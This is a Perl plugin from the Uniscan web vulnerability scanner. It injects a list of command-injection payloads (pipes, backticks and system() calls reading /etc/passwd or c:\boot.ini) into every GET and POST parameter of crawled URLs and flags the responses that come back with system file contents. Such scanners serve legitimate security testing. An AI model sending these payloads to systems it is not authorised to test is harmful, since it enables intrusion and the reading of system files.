package Plugins::Tests::Dynamic::checkRCE;

use Uniscan::Configure;
use Uniscan::Functions;
use Thread::Queue;
use Uniscan::Http;
use threads;

	my $c = Uniscan::Configure->new(conffile => "uniscan.conf");
	my $func = Uniscan::Functions->new();
	my $http = Uniscan::Http->new();


sub new {
	my $class    = shift;
	my $self     = {name => "Remote Command Execution tests", version => 1.0};
	our $enabled  = 1;
	our %conf = ( );
	%conf = $c->loadconf();
	our $q : shared = "";
	our $vulnerable :shared = 0;
	return bless $self, $class;
}


sub execute(){
	my ($self,@urls) = @_;
	our @RCE = (
		'|cat /etc/passwd',
		'|cat /etc/passwd|',
		'|cat /etc/passwd%00|',
		'|cat /etc/passwd%00.html|',
		'|cat /etc/passwd%00.htm|',
		'|cat /etc/passwd%00.dat|',
		'system("cat /etc/passwd");',
		'.system("cat /etc/passwd").',
		':system("cat /etc/passwd");',
		';system("cat /etc/passwd").',
		';system("cat /etc/passwd")',
		';system("cat /etc/passwd");',
		':system("cat /etc/passwd").',
		'`cat /etc/passwd`',
		'`cat /etc/passwd`;',
		';cat /etc/passwd;',
		'|type c:\boot.ini',
		'|type c:\boot.ini|',
		'|type c:\boot.ini%00|',
		'|type c:\boot.ini%00.html|',
		'|type c:\boot.ini%00.htm|',
		'|type c:\boot.ini%00.dat|',
		'system("type c:\boot.ini");',
		'.system("type c:\boot.ini").',
		':system("type c:\boot.ini");',
		';system("type c:\boot.ini").',
		';system("type c:\boot.ini")',
		';system("type c:\boot.ini");',
		':system("type c:\boot.ini").',
		'`type c:\boot.ini`',
		'`type c:\boot.ini`;',
		';type c:\boot.ini;'
		);

	$func->write("|"." "x99);
	$func->write("|"." "x99);
	$func->write("| RCE:");
	&ScanRCECrawler(@urls);	
	&ScanRCECrawlerPost(@urls);
}


sub clean{
	my $self = shift;
	$vulnerable = 0;
}


sub ScanRCECrawler(){
	my @urls = @_;
	my @tests = &GenerateTests("RCE", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRCE", @tests) if(scalar(@tests));
}

sub ScanRCECrawlerPost(){
	my @urls = @_;
	my @tests = &GenerateTestsPost("RCE", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRCEPost", @tests) if(scalar(@tests));
}

sub TestRCE(){
	while($q->pending){
		my $test = $q->dequeue;
		print "[*] Remaining tests: ". $q->pending ." Threads: " .(scalar(threads->list())+1) ."       \r";
		my $resp = $http->GET($test);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [RCE] $test               ");
		}
		$resp = 0;
	}
}


sub TestRCEPost(){
	while($q->pending){
		my $test = $q->dequeue;
		my ($url, $data) = split('#', $test);
		print "[*] Remaining tests: ". $q->pending ." Threads: " .(scalar(threads->list())+1) ."       \r";
		my $resp = $http->POST($url, $data);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [RCE] $url               \n| Post data: $data               ");
		}
		$resp = 0;
	}
}

sub GenerateTests(){
	my ($test, @list) = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/ && $line !~/#/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				no strict 'refs';
				if($var_temp){
					foreach my $str (@{$test}){
						$temp = $line;
						$str = urlencode($str) if($conf{'url_encode'} == 1);
						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E/$t/g;
						push(@list2, $temp);
					}
				}
			}
		@variables = ();
		}
	}
	@list = ();
	return @list2;
}

sub GenerateTestsPost(){
  	my ($test, @list) = @_;
  	my @list2 = ();
  	foreach my $line (@list){
		next if($line !~/#/);
  		my ($url, $line) = split('#', $line);
  		$line =~ s/&amp;/&/g;
  		$line =~ s/\[\]//g;
  		if($line =~ /=/){
  			my $temp = $line;
  			$temp = substr($temp,index($temp, '?')+1,length($temp));
  			my @variables = split('&', $temp);
  			for(my $x=0; $x< scalar(@variables); $x++){
  				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
  				no strict 'refs';
  				if($var_temp){
  					foreach my $str (@{$test}){
  						$temp = $line;
  						$str = urlencode($str) if($conf{'url_encode'} == 1);
  						my $t = $var_temp . $str;
  						$temp =~ s/\Q$variables[$x]\E/$t/g;
  						push(@list2, $url . '#' .$temp);
  					}
  				}
  			}
  		}
  	}
  	@list = ();
  	return @list2;
 }


 sub urlencode {
    my $s = shift;
    $s =~ s/ /+/g;
    $s =~ s/([^A-Za-z0-9\+-])/sprintf("%%%02X", ord($1))/seg;
    $s =~s/%7C/\|/g;
    $s =~ s/%25/%/g;
    return $s;
}


sub threadnize(){
	my ($fun, @tests) = @_;
	$q = 0;
	$q = new Thread::Queue;
	$tests[0] = 0;
	foreach my $test (@tests){
		$q->enqueue($test) if($test);
	}

	my $x=0;
	while($q->pending() && $x <= $conf{'max_threads'}-1){
		no strict 'refs';
		threads->new(\&{$fun});
		$x++;
	}

	my @threads = threads->list();
        foreach my $running (@threads) {
		$running->join();
		print "[*] Remaining tests: ". $q->pending ." Threads: " .(scalar(threads->list())+1) ."       \r";
        }
	@threads = ();
	$q = 0;
}


sub status(){
 my $self = shift;
 return $enabled;
}

1;
